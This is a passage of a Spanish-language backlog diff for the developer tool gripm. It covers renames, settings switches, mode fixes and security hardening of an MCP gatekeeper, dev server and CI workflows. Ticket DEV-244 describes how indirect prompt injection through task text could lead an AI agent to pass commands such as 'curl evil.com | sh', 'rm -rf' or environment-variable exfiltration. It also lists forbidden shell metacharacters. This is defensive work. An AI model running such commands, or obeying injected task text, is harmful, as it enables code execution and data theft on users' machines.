+2. **Directorios y rutas en disco:**
+   - Purgar búsquedas de carpetas `.devboard/` y archivos `.devboard/config.json` o `.devboard/backlog.json` en `vite.config.ts` y scripts.
+   - Purgar referencias a `data/dev-board.json` y `data/projects-registry.json` (incluyendo `.gitignore` y scripts de empaquetado).
+   - Único contrato válido: `.gripm/`.
+
+3. **Claves de almacenamiento en navegador (`src/utils/storage.ts`):**
+   - Retirar los 9 arrays de claves alias legacy (`devboard-theme`, `devboard_active_tab`, `devboard_active_project_id`, `devboard_kanban_sprint`, etc.).
+   - Único contrato válido: `gripm_*` / `gripm-*`.
+
+4. **Nombres internos, plugins y contratos de TypeScript:**
+   - En `vite.config.ts`: renombrar `devBoardApi()` a `gripmApi()`, `DevBoardPlugin` a `GripmPlugin`, y el nombre del plugin `'vite-plugin-dev-board-api'` a `'vite-plugin-gripm-api'`.
+   - En `src/types.ts`: eliminar alias de tipo `export type DevBoardConfig = GripmConfig`.
+   - En `src/api.ts`: renombrar propiedad `hasDevBoard` a `hasGripm`.
+   - En `scripts/registryConfig.js`: renombrar `getDevBoardHomeDir()` a `getGripmHomeDir()`.
+
+5. **Logs de consola y textos de usuario:**
+   - Reemplazar prefijos de log `[DevBoard API]`, `[DevBoard Watcher]`, `[DevBoard FS]`, `[DevBoard Backlog.md]` por `[gripm ...]`.
+   - Corregir descripción del proyecto demo en `vite.config.ts` ("Proyecto de demostración de gripm").
+
+6. **Actualización de suites de test:**
+   - Actualizar `scripts/test-api-security.js`, `scripts/verify-integration.js`, `scripts/verify-optimistic-locking.js`, `scripts/verify-sse.js` y `scripts/verify-legacy-import.js` para buscar e interactuar exclusivamente con `'vite-plugin-gripm-api'` y variables `GRIPM_*`.
+
+**Criterios de Aceptación:**
+- [x] #1 Cero ocurrencias de variables process.env.DEVBOARD_* en código fuente activo
+- [x] #2 Cero referencias a carpetas .devboard/ o archivos dev-board.json en el runtime y scripts
+- [x] #3 src/utils/storage.ts purgado de arrays de claves de retrocompatibilidad devboard_*
+- [x] #4 vite.config.ts y types.ts renombran plugins y contratos internos a gripmApi / vite-plugin-gripm-api
+- [x] #5 Logs de consola y descripciones en runtime estandarizados 100% en gripm
+- [x] #6 Suites de prueba actualizadas al nuevo estándar sin romper ningún paso de la suite
+- [x] #7 Pirámide de verificación en verde (tsc --noEmit, npm test con 16 pasos, backlog:sync, backlog:check)
+
+---
+
+#### [DEV-239] Unificación de switches on/off en Settings y erradicación de checkboxes nativos simples
+- **Prioridad**: `high` | **Tipo**: `feature`
+
+Al evolucionar la configuración de **Modules & Add-ons** (DEV-220) hacia switches interactivos on/off, se produjo una inconsistencia de UX en el resto de los paneles de configuración de `SettingsView.tsx`. Los controles booleanos en **Workflows & Views**, **Tablero Kanban** y **Apariencia** permanecieron implementados con `<input type="checkbox">` nativos del navegador, creando una experiencia fragmentada, poco ergonómica y visualmente heterogénea.
+
+### Objetivos y Solución
+
+1. **Componente Reutilizable y Accesible `SettingsSwitch`:**
+   - Crear un componente `SettingsSwitch` en `src/components/SettingsView.tsx` estilizado con el design system canónico de Gripm.
+   - Pista con esquinas redondeadas (`w-11 h-6`), botón deslizante con sombra sutil (`h-5 w-5 shadow-xs`) y transición suave (`transition-all duration-200`).
+   - Micro-interacción táctil (`active:scale-95`).
+   - Accesibilidad con foco visible de alto contraste (`peer-focus-visible:ring-2 peer-focus-visible:ring-indigo-500 peer-focus-visible:ring-offset-2`) y soporte `aria-label`.
+   - Contenedor `span` para evitar anidamiento prohibido de `<label>` en tarjetas que ya son clickeables.
+
+2. **Reemplazo Integral en Todas las Pestañas Afectadas:**
+   - **Workflows & Views (`views`):** Reemplazar los 3 checkboxes nativos de pestañas visibles (`enabledTabs.kanban`, `enabledTabs.sprint`, `enabledTabs.release`).
+   - **Tablero Kanban (`kanban`):** Reemplazar los 2 checkboxes nativos de configuración (`showIdeasByDefault`, `showDoneHistoryByDefault`).
+   - **Apariencia (`visual`):** Reemplazar los 2 checkboxes nativos de preferencias (`autoSave`, `rankingEnabled`).
+   - **Modules & Add-ons (`modules`):** Unificar los 3 switches existentes (`sprint`, `release`, `modeState === 'multi'`) usando también `SettingsSwitch` para eliminar código duplicado.
+
+3. **Pruebas y Verificación:**
+   - Validar estáticamente y unitariamente en tests que no queden checkboxes nativos simples en `SettingsView.tsx`.
+   - Validar la accesibilidad y ergonomía con `npm run audit:ux` y la suite de pruebas completa `npm test`.
+
+**Criterios de Aceptación:**
+- [x] #1 Crear componente SettingsSwitch reutilizable, accesible (teclado + aria-label) y consistente en SettingsView.tsx
+- [x] #2 Reemplazar checkboxes simples en Workflows & Views (kanban, sprint, release) por SettingsSwitch
+- [x] #3 Reemplazar checkboxes simples en Tablero Kanban (showIdeasByDefault, showDoneHistoryByDefault) por SettingsSwitch
+- [x] #4 Reemplazar checkboxes simples en Apariencia (autoSave, rankingEnabled) por SettingsSwitch
+- [x] #5 Unificar los switches de Modules & Add-ons bajo el componente SettingsSwitch sin duplicación de markup
+- [x] #6 Zero errores de tipos (npx tsc --noEmit) y cero checkboxes nativos residuales en SettingsView.tsx
+- [x] #7 Suite de pruebas completa (npm test) y auditoría UX (npm run audit:ux) en verde sin regresiones
+
+---
+
+#### [DEV-240] Intercambiabilidad de modos --single y --hub en runtime y persistencia activa del proyecto demo
+- **Prioridad**: `high` | **Tipo**: `bug`
+
+Tras ejecutar la inicialización de un repositorio mediante `gripm --init`, las opciones de runtime `--single` y `--hub` (o `--multi`) no funcionaban de forma intercambiable y la experiencia con el proyecto Demo presentaba fallas de activación y persistencia:
+1. **Conflicto de Precedencia CLI vs. Configuración Local:** Al iniciar el servidor web, `src/App.tsx` subordinaba la bandera `singleProject` a la configuración estática `.gripm/config.json` (`config.mode === 'single'`), ignorando la bandera CLI `--hub` recibida por el servidor y ocultando el selector de proyectos.
+2. **Sobreescritura Incondicional de `activeProjectId`:** En `vite.config.ts`, la función `getRegistry()` sobreescribía `reg.activeProjectId = existingLocal.id` en cada petición HTTP si detectaba el repositorio local actual, revirtiendo inmediatamente cualquier selección del usuario hacia el proyecto demo u otro proyecto del Hub.
+3. **Resolución Rígida de `activeProject`:** En `vite.config.ts`, la resolución del proyecto activo priorizaba la ruta del sistema de archivos sobre `registry.activeProjectId`, impidiendo que el backend despachara las tareas y metadatos del proyecto demo en modo Hub.
+4. **Flags de CLI en `bin/gripm.js`:** La ejecución sin banderas (`gripm`) forzaba incondicionalmente `process.env.GRIPM_MODE = 'single'`, impidiendo que proyectos configurados con modo hub en `.gripm/config.json` funcionaran adecuadamente al invocar el binario directamente.
+
+### Solución
+
+1. **Precedencia canónica en CLI (`bin/gripm.js`):**
+   - `--hub` / `--multi` establece `GRIPM_MODE = 'multi'`.
+   - `--single` establece `GRIPM_MODE = 'single'`.
+   - Ejecución sin banderas elimina `GRIPM_MODE` para permitir que el servidor derive el modo desde `.gripm/config.json` o la cantidad de proyectos en el registro.
+2. **Preservación de identidad activa en `vite.config.ts`:**
+   - En `getRegistry()`, solo se asigna `reg.activeProjectId = existingLocal.id` si `reg.activeProjectId` no estaba previamente definido.
+   - En la resolución de `activeProject`, en modo Hub (`!isSingleMode`) se prioriza `registry.activeProjectId`, despachando el proyecto demo y sus tareas completas.
+3. **Precedencia de runtime en cliente (`src/App.tsx`):**
+   - El prop `singleProject` de `Header` consume prioritariamente `boardData.singleProject`, respondiendo dinámicamente a la bandera del CLI.
+   - Ante eventos SSE `settings_changed`, se revalida `loadData(true)` para reflejar cambios de modo en caliente.
+4. **Badge diferenciado en Header (`src/components/Header.tsx`):**
+   - Si se ejecuta en modo mono-proyecto sobre el proyecto demo, se muestra la etiqueta "Demo" en lugar de "Local".
+
+**Criterios de Aceptación:**
+- [x] #1 bin/gripm.js respeta flags CLI --single y --hub explícitas y no fuerza single en ejecuciones sin banderas
+- [x] #2 vite.config.ts preserva registry.activeProjectId sin sobreescribirlo con el repo local en cada petición
+- [x] #3 vite.config.ts en modo hub resuelve activeProject desde registry.activeProjectId permitiendo visualizar proyecto demo
+- [x] #4 src/App.tsx prioriza boardData.singleProject sobre config.mode permitiendo alternar --single y --hub en runtime
+- [x] #5 Header.tsx distingue badge 'Demo' vs 'Local' en modo singleProject
+- [x] #6 Pruebas automatizadas validan la precedencia de flags CLI y la activación del proyecto demo
+
+---
+
+#### [DEV-241] Consistencia condicional de configuraciones segun modulos y add-ons activos
+- **Prioridad**: `high` | **Tipo**: `bug`
+
+Garantizar coherencia total en la vista de configuración (`SettingsView`):
+1. **Disponibilidad condicional según módulos instalados/activos:** Solo exponer configuraciones correspondientes a módulos habilitados en *Módulos & Add-ons* (o seleccionados en el onboarding de `--init`).
+2. **Metodologías acopladas al módulo Sprints:** Cuando el módulo Sprints está inactivo (`enabledTabs.sprint === false`), las metodologías Scrum y Scrumban se deshabilitan visual y funcionalmente (mostrando badge de advertencia y tooltip/descripción informativa), forzando y preservando la metodología en `kanban`.
+3. **Vistas predeterminadas consistentes:** Las opciones de vista inicial (`sprint`, `release`) quedan deshabilitadas si sus respectivos módulos están inactivos, con fallback automático a `kanban` para evitar pantallas inaccesibles o rotas.
+4. **Pestañas visibles en cabecera:** Reflejar inequívocamente el estado de los módulos de Sprints y Releases en la sección de pestañas superiores, deshabilitando su conmutación individual cuando el módulo raíz está desactivado e informando al usuario sobre su activación en *Módulos & Add-ons*.
+
+**Criterios de Aceptación:**
+- [x] #1 Scrum y Scrumban quedan visual y funcionalmente deshabilitados en Workflow & Views cuando el modulo Sprints esta inactivo
+- [x] #2 La vista predeterminada no permite seleccionar Sprints o Releases si sus modulos correspondientes estan inactivos y hace fallback limpio a kanban
+- [x] #3 La seccion de pestanas visibles en cabecera bloquea conmutadores de modulos inactivos con indicacion explicita
+- [x] #4 Al desactivar modulos en Modulos & Add-ons, el estado local y persistido ajusta automaticamente methodology y defaultView sin provocar inconsistencias
+- [x] #5 Suite de pruebas y Piramide de Verificacion pasan con codigo 0
+
+---
+
+#### [DEV-242] Remediacion integral de seguridad Fase 2: erradicacion de RCE en frontmatter y auditoria MCP (SEC-01 a SEC-10)
+- **Prioridad**: `high` | **Tipo**: `bug`
+
+Implementación y certificación de la **Fase 2 de Seguridad** definida en la auditoría integral de `@gripm/board@1.1.0` (`docs/auditoria-2026-10-10.md` §4 y §11.2):
+
+1. **SEC-01 · Ejecución ciega de comandos persistidos en frontmatter:**
+   El Gatekeeper de `scripts/mcp-server.ts` leía `verifyCommand` desde `rawExtraFrontmatter` del archivo Markdown en disco y lo persistía tras cada transición. Cualquier tarea con comandos shell maliciosos en su frontmatter lograba ejecución de código (RCE) en la máquina del próximo agente o usuario al transicionar a `ready` o `done`. Se erradica la lectura ciega desde disco y la persistencia de scripts en los archivos Markdown.
+2. **SEC-02 · Mutación silenciosa y fabricación de ACs en `gripm_sync_backlog`:**
+   El parámetro `autoFix` tenía valor por defecto `true`, alterando `- [ ]` a `- [x]` sin verificación real en tareas `done`. Se establece `autoFix` en `false` por defecto (modo seguro/solo lectura de auditoría).
+3. **SEC-03 · Contención de rutas en `--repo` del servidor MCP:**
+   Validar contención de la ruta `--repo` contra límites del sistema para impedir traversals o rutas no autorizadas.
+4. **SEC-05 · Validación estricta de `inputSchema` en herramientas MCP:**
+   Validar parámetros en `handleToolCall` (tipos numéricos, límites y rangos en `limit`, `toggleAcIndex`), rechazando valores inválidos con error descriptivo en lugar de fallos silenciosos.
+5. **SEC-08 · Higiene en `verify-publish-surface.js` y detección multiplataforma:**
+   Eliminar el path privado del autor hardcodeado en la fuente del verificador y extender las expresiones regulares de fuga de rutas de usuario para cubrir Windows (`C:\Users\...`) y Linux (`/home/...`).
+6. **SEC-09 · Trazabilidad auditable en bypass `force: true`:**
+   Registrar advertencia explícita y metadata de auditoría cuando se salten las validaciones del Gatekeeper mediante `force: true`.
+7. **SEC-06, SEC-07, SEC-10 · Declaración explícita de superficie de riesgo:**
+   Crear documento canónico `SECURITY.md` y documentar en `AGENTS.md` el modelo de amenazas, la frontera stdio, la exposición en `--host 0.0.0.0` y las garantías del Gatekeeper.
+
+**Criterios de Aceptación:**
+- [x] #1 scripts/mcp-server.ts nunca ejecuta verifyCommand proveniente del frontmatter de un archivo en disco (SEC-01)
+- [x] #2 scripts/mcp-server.ts nunca persiste comandos shell ejecutables en el frontmatter de los archivos .md (SEC-01)
+- [x] #3 gripm_sync_backlog opera con autoFix: false por defecto y no muta ACs ni tareas sin opt-in explícito (SEC-02)
+- [x] #4 scripts/mcp-server.ts valida contención y existencia de --repo impidiendo escape a rutas del sistema (SEC-03)
+- [x] #5 handleToolCall valida tipos y rangos de argumentos (limit, toggleAcIndex) retornando errores explícitos (SEC-05)
+- [x] #6 verify-publish-surface.js no hardcodea rutas privadas de autores y detecta rutas absolutas de Windows, Linux y macOS (SEC-08)
+- [x] #7 El uso de force: true emite advertencia explícita de auditoría en la respuesta del Gatekeeper (SEC-09)
+- [x] #8 SECURITY.md y AGENTS.md documentan formalmente la superficie de riesgo, modelo de amenazas y mitigaciones (SEC-06, SEC-07, SEC-10)
+- [x] #9 Pruebas automatizadas en scripts/verify-mcp-binary.js y scripts/test-api-security.js validan todas las mitigaciones con código 0
+
+---
+
+#### [DEV-243] Security headers en UI dev server (CSP, frame-ancestors, nosniff), fuentes locales y limite de body HTTP (413)
+- **Prioridad**: `high` | **Tipo**: `feature`
+
+Implementación de mitigaciones de seguridad en el dev server y capa UI de gripm identificadas en la auditoría técnica de seguridad:
+
+1. **Security Headers & Anti-Clickjacking:**
+   - Inyección de cabeceras de seguridad en respuestas del middleware de `vite.config.ts`:
+     - `Content-Security-Policy`: con directivas estrictas (`default-src 'self'`, `frame-ancestors 'none'`, `object-src 'none'`).
+     - `X-Frame-Options: DENY`: impide que sitios web maliciosos embeban `http://localhost:4100` en iframes para ataques de clickjacking.
+     - `X-Content-Type-Options: nosniff`: previene MIME-sniffing de scripts o estilos.
+     - `Referrer-Policy: strict-origin-when-cross-origin`: protege la fuga de rutas internas en cabeceras Referer.
+
+2. **Privacidad y Soporte Offline (Self-hosted Fonts):**
+   - Retirar enlaces externos a Google Fonts (`fonts.googleapis.com` y `fonts.gstatic.com`) de `index.html`.
+   - Utilizar tipografías locales/autohospedadas o font-stack moderna del sistema, permitiendo que gripm sea 100% utilizable offline y sin telemetría de navegación hacia servidores de terceros.
+
+3. **Límite de Tamaño de Body HTTP (Anti-DoS local):**
+   - Incorporar guarda `MAX_BODY_SIZE = 10 * 1024 * 1024` (10 MB) en el acumulador de `req.on('data')` en `vite.config.ts`.
+   - Responder inmediatamente con `413 Payload Too Large` y destruir el flujo si la carga supera el límite, previniendo DoS por agotamiento de memoria (OOM).
+
+4. **Regresión y Verificación Automatizada:**
+   - Ampliar `scripts/test-api-security.js` con aserciones ejecutables contra el middleware real para todas las cabeceras y el límite de body 413.
+
+**Criterios de Aceptación:**
+- [x] #1 vite.config.ts inyecta cabeceras de seguridad (CSP, X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Referrer-Policy) en respuestas HTTP
+- [x] #2 CSP declara frame-ancestors 'none' bloqueando clickjacking en localhost
+- [x] #3 index.html no realiza peticiones externas a Google Fonts utilizando tipografías locales o del sistema
+- [x] #4 vite.config.ts valida tamaño máximo del body (MAX_BODY_SIZE = 10MB) respondiendo 413 Payload Too Large si se excede
+- [x] #5 scripts/test-api-security.js incluye pruebas automatizadas para CSP, frame-ancestors, nosniff y límite 413 de body
+- [x] #6 Pirámide de verificación en verde (tsc, npm test, backlog:sync, backlog:check, publish:check, build)
+
+---
+
+#### [DEV-244] Endurecimiento de verifyCommand en Gatekeeper MCP contra prompt injection (allowlist de scripts package.json y anti-subshell)
+- **Prioridad**: `high` | **Tipo**: `bug`
+
+Endurecimiento del Gatekeeper de ejecución de verificación en `scripts/mcp-server.ts`:
+
+Aunque la Fase 2 (DEV-242 / SEC-01) erradicó la lectura ciega de comandos desde el frontmatter YAML en disco, un agente de IA que sea inducido mediante prompt injection indirecto (por ejemplo, a través de instrucciones maliciosas en el título o descripción de una tarea externa) podría pasar un comando shell arbitrario destructivo en el argumento `verifyCommand` (`curl evil.com | sh`, `rm -rf`, exfiltración de variables de entorno).
+
+Para mitigar este vector:
+1. **Restricción a scripts de `package.json` o binarios autorizados:**
+   - `verifyCommand` solo puede invocar scripts existentes en el `package.json` del repositorio (`npm test`, `npm run <script>`, `npx <allowed-tool>`).
+2. **Rechazo estricto de metacaracteres shell:**
+   - Prohibir operadores de tubería, encadenamiento y redirección (`|`, `&`, `;`, `` ` ``, `$()`, `<`, `>`).
+3. **Validación previa sin ejecución:**
+   - Si el comando contiene caracteres prohibidos o no coincide con los scripts autorizados, el Gatekeeper rechaza la transición de inmediato con un error descriptivo sin invocar subshells.
+
+**Criterios de Aceptación:**
+- [x] #1 scripts/mcp-server.ts restringe verifyCommand exclusivamente a scripts definidos en package.json (npm test, npm run <script>) o comandos de allowlist segura
+- [x] #2 Rechazo estricto de metacaracteres de encadenamiento o subshell (| & ; ` $() < >) en verifyCommand
+- [x] #3 Invocaciones con comandos no autorizados devuelven error descriptivo del Gatekeeper antes de spawnear cualquier proceso
+- [x] #4 scripts/verify-mcp-binary.js incluye pruebas automatizadas de rechazo ante inyección de comandos en verifyCommand
+- [x] #5 Pirámide de verificación en verde (tsc, npm test, backlog:sync, backlog:check, publish:check, build)
+
+---
+
+#### [DEV-246] Endurecimiento de DevSecOps en GitHub Actions (SCA audit, permissions minimos y anti-script-injection en publish)
+- **Prioridad**: `medium` | **Tipo**: `chore`
+
+Endurecimiento de la cadena de suministro y workflows de CI/CD en `.github/workflows/`:
+
+1. **Principio de menor privilegio en workflows:**
+   - Establecer `permissions: contents: read` a nivel global en `ci.yml` y `publish.yml` para impedir que tokens de Actions tengan permisos excesivos de escritura por defecto.
+2. **SCA (Software Composition Analysis):**
+   - Incorporar paso automatizado de `npm audit` en `ci.yml` (`npm run audit:deps`) para bloquear vulnerabilidades críticas en dependencias.
+3. **Erradicación de Script Injection en Workflows:**
+   - En `publish.yml`, evitar interpolación directa `${{ github.event.inputs.tag }}` en scripts de shell; canalizar inputs a través de variables de entorno seguras (`env: INPUT_TAG: ${{ github.event.inputs.tag }}`).
+
+**Criterios de Aceptación:**
+- [x] #1 ci.yml y publish.yml declaran bloque permissions: contents: read a nivel de workflow
+- [x] #2 ci.yml incorpora paso de SCA (npm audit --audit-level=high)
+- [x] #3 publish.yml pasa inputs de dispatch mediante bloque env: en lugar de interpolación directa en script bash
+- [x] #4 Verificación local de sintaxis y coherencia de pipelines
 
 ---
 
